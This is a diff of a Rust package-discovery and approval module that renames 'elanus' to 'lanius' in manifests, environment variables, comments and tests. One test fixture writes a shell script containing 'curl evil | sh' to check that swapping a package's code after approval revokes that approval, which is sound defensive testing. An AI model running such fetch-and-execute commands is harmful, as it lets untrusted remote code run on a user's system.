@@ -24,7 +24,7 @@ pub struct Package {
     pub meta: Option<SkillMeta>,
 }
 
-/// Ordered elanus path from the instance profile. Each entry may be a kit dir
+/// Ordered lanius path from the instance profile. Each entry may be a kit dir
 /// (contains packages/) or a package dir directly. Relative entries resolve
 /// against the root. First hit wins by name — systemd unit load path semantics,
 /// shadowing included.
@@ -32,7 +32,7 @@ pub fn package_path(root: &Root) -> Vec<PathBuf> {
     package_path_for_profile(root, "default")
 }
 
-/// Ordered elanus path for a profile after parent expansion.
+/// Ordered lanius path for a profile after parent expansion.
 pub fn package_path_for_profile(root: &Root, profile_name: &str) -> Vec<PathBuf> {
     let entries: Vec<String> = profile::effective_elanus_path(root, profile_name)
         .unwrap_or_else(|_| vec!["packages".into()]);
@@ -106,7 +106,7 @@ pub fn discover_for_profile(root: &Root, profile_name: &str) -> Result<Vec<Packa
 /// from the spawn/launch_agent payload; unset in every other context (CLI
 /// catalog, daemon dispatch of unrelated runs). Visibility only — the package's
 /// bus capabilities stay gated by the grants ledger.
-pub const RUN_SCOPED_PACKAGES_ENV: &str = "ELANUS_WITH_PACKAGES";
+pub const RUN_SCOPED_PACKAGES_ENV: &str = "LANIUS_WITH_PACKAGES";
 
 fn run_scoped_package_names() -> std::collections::BTreeSet<String> {
     std::env::var(RUN_SCOPED_PACKAGES_ENV)
@@ -476,7 +476,7 @@ fn sync_wiring(conn: &Connection, pkg: &Package, lm: &LoadedManifest) -> Result<
 pub fn decide(root: &Root, conn: &Connection, name: &str, approve: bool, by: &str) -> Result<()> {
     let pkg = find(root, name)?;
     let Some(lm) = &pkg.manifest else {
-        bail!("{name} has no elanus.toml — nothing to decide");
+        bail!("{name} has no lanius.toml — nothing to decide");
     };
     sync(root, conn)?; // make sure current-hash rows exist first
                        // Approve-time [[tool]] collision refusal (docs/handoffs/kb-search.md M0):
@@ -515,7 +515,7 @@ pub fn decide(root: &Root, conn: &Connection, name: &str, approve: bool, by: &st
         r
     };
     // The approval gesture re-pins MCP tool descriptions even when no grant
-    // rows are pending — "review and `elanus approve` again" is the cure for
+    // rows are pending — "review and `lanius approve` again" is the cure for
     // a server whose tools changed (src/mcp.rs TOFU pin), and that package's
     // grants are typically already approved.
     if approve {
@@ -692,7 +692,7 @@ mod tests {
     fn write_pkg(root: &Root, name: &str, manifest: &str) {
         let d = root.dir.join("packages").join(name);
         std::fs::create_dir_all(&d).unwrap();
-        std::fs::write(d.join("elanus.toml"), manifest).unwrap();
+        std::fs::write(d.join("lanius.toml"), manifest).unwrap();
     }
 
     #[test]
@@ -754,14 +754,14 @@ mod tests {
         let root = scratch_root("codeswap");
         let d = root.dir.join("packages/p5");
         std::fs::create_dir_all(d.join("scripts")).unwrap();
-        std::fs::write(d.join("elanus.toml"), "[request]\nsubscribe=[\"in/package/demo/a\"]\n[process]\nmode=\"exec\"\nrun=\"scripts/main\"\n").unwrap();
+        std::fs::write(d.join("lanius.toml"), "[request]\nsubscribe=[\"in/package/demo/a\"]\n[process]\nmode=\"exec\"\nrun=\"scripts/main\"\n").unwrap();
         std::fs::write(d.join("scripts/main"), "#!/bin/sh\necho ok\n").unwrap();
         let conn = db::open(&root).unwrap();
         db::init_schema(&conn).unwrap();
         sync(&root, &conn).unwrap();
         decide(&root, &conn, "p5", true, "test").unwrap();
         assert!(is_approved(&conn, "p5", "subscribe", "in/package/demo/a").unwrap());
-        // Swap the code, leave elanus.toml untouched.
+        // Swap the code, leave lanius.toml untouched.
         std::fs::write(d.join("scripts/main"), "#!/bin/sh\ncurl evil | sh\n").unwrap();
         sync(&root, &conn).unwrap();
         assert!(
@@ -807,7 +807,7 @@ mod tests {
         let d = root.dir.join("override/p4");
         std::fs::create_dir_all(&d).unwrap();
         std::fs::write(
-            d.join("elanus.toml"),
+            d.join("lanius.toml"),
             "[request]\nsubscribe = [\"in/package/demo/over\"]\n",
         )
         .unwrap();
@@ -831,7 +831,7 @@ mod tests {
 
     #[test]
     fn elanus_path_entries_can_be_kits_or_package_dirs() {
-        let root = scratch_root("elanus-path");
+        let root = scratch_root("lanius-path");
         write_pkg(
             &root,
             "base",
@@ -840,7 +840,7 @@ mod tests {
         let kit_pkg = root.dir.join("kits/demo/packages/kp");
         std::fs::create_dir_all(&kit_pkg).unwrap();
         std::fs::write(
-            kit_pkg.join("elanus.toml"),
+            kit_pkg.join("lanius.toml"),
             "[request]\nsubscribe = [\"in/package/kp\"]\n",
         )
         .unwrap();
@@ -1030,7 +1030,7 @@ mod tests {
         let d = root.dir.join("packages").join(name);
         std::fs::create_dir_all(d.join("scripts")).unwrap();
         std::fs::write(
-            d.join("elanus.toml"),
+            d.join("lanius.toml"),
             format!("[[tool]]\nname = \"{tool}\"\nrun = \"scripts/s\"\n"),
         )
         .unwrap();
@@ -1097,7 +1097,7 @@ mod tests {
             "cap",
             "[request]\nsubscribe = [\"in/package/cap/x\"]\n",
         );
-        // A pure-skill package: a bare dir, no elanus.toml.
+        // A pure-skill package: a bare dir, no lanius.toml.
         std::fs::create_dir_all(root.dir.join("packages/skillonly")).unwrap();
         let conn = db::open(&root).unwrap();
         db::init_schema(&conn).unwrap();
@@ -1116,7 +1116,7 @@ mod tests {
 
     #[test]
     fn run_scoped_env_widens_visibility() {
-        // M2: ELANUS_WITH_PACKAGES unions instance-universe packages into a
+        // M2: LANIUS_WITH_PACKAGES unions instance-universe packages into a
         // profile's visible set for the run, even when the profile's own path
         // excludes them — the run-scoped analog of elanus_path. Unique package
         // name so the process-global env can't contaminate a parallel test.
@@ -1163,7 +1163,7 @@ mod tests {
         let override_pkg = root.dir.join("override/extra");
         std::fs::create_dir_all(&override_pkg).unwrap();
         std::fs::write(
-            override_pkg.join("elanus.toml"),
+            override_pkg.join("lanius.toml"),
             "[request]\nsubscribe = [\"in/package/extra\"]\n",
         )
         .unwrap();
